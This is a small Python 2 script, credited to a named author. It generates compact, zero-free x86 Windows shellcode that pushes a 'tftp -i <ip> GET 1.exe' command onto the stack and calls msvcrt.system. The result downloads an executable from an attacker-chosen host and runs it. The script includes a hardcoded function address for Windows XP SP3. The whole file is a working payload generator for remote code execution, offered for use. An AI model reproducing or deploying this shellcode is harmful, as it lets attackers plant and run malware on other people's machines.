#!/bin/python

#Author: Semen Alexandrovich Lyhin.
#https://www.linkedin.com/in/semenlyhin/
#This script generates x86 shellcode to download and execute .exe file via tftp. File name should be equal to: "1.exe"
#Lenght: 51-56 bytes, zero-free.

import sys

def GetOpcodes(ip,addr):
    command = r"tftp -i " + ip + r" GET 1.exe&1"
    #add spaces, if required.
    command += (4-len(command)%4)%4*" "

    #calculate opcodes for the command
    opcodes = ""
    for s in [command[i:i+4] for i in xrange(0,len(command),4)][::-1]: #split by 4-char strings and reverse order of the strings in the list
        opcodes += "68" #push
        for char in s:
            opcodes += hex(ord(char))[2:].zfill(2)

    #zero out eax and push it. If there is zeroed register, we can simplify this operation.  Check it manually.
    opcodes = "33C050" + opcodes
    #push esp. Modify this part, to make program stabler. #mov eax,esp #push eax
    opcodes += "54"
    #move addr of msvcrt.system to ebx
    opcodes += "BB" + addr
    #call ebx
    opcodes += "FFD3"
    return opcodes

if __name__ == "__main__":
    if len(sys.argv)!=3:
        print "Usage: " + sys.argv[0] + " <ip> <address of msvcrt.system>"
        print "Address of msvcrt.system == C793C277 for Windows XP Professional SP3"
        exit()
    opcodes = GetOpcodes(sys.argv[1],sys.argv[2])
    print opcodes
    print "Lenght:" + str(len(opcodes)/2)